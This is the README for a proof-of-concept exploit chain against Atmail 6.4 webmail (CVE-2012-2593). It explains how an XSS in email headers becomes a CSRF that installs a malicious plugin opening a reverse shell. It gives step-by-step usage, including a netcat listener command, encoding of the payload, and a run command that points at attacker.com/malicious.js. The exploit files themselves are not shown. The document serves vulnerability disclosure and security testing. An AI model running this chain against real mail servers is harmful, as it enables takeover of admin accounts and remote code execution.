# Atmail XSS-CSRF-RCE Exploit Chain PoC 

atmail-rce.py: Exploits CVE-2012-2593 in Atmail's webmail interface.

atmail-csrf.js: Javascript file which leverages CVE 2012-2593 into a CSRF 
                to install a malicious plugin which executes a reverse shell

Plugin.php: Atmail plugin to be installed which calls a reverse shell

**!!Only use against servers on which you have permission to test**

## Summary
 Atmail email server version 6.4 has a XSS vulnerability in both the *Date* email header
 and the *Email Body* (via iFrame injection). This is leveraged into a CSRF using the 
 javascript XHR api to send a request with the admin user's cookie to the admin webpanel, 
 installing a malicious Plugin which executes code for a reverse shell.  

## Proof of Concept
1. Start a netcat listener 
   `nc -lvp 4444`
2. Open Plugin.php and change the IP address and Port to that of your netcat listener
3. compress Plugin using gzip and encode in base64
   `gzip -c Plugin.php | base64 | tr -d [:space:]`
4. Copy and Paste the above output into the atmail-csrf.js data variable
5. Run the atmail-rce.py script 
   `python3 ./atmail-rce.py -u attacker@localhost -r admin@localhost -x http://attacker.com/malicious.js -t http://atmail.com/ `
6. Wait until the admin user logs into their email

## Caveats
* Only works if target of XSS is an admin user of Atmail
* Only works if target is signed in to both the webmail interface and the admin interface of the server
* Only works if plugin installation is allowed on the server (on by default)
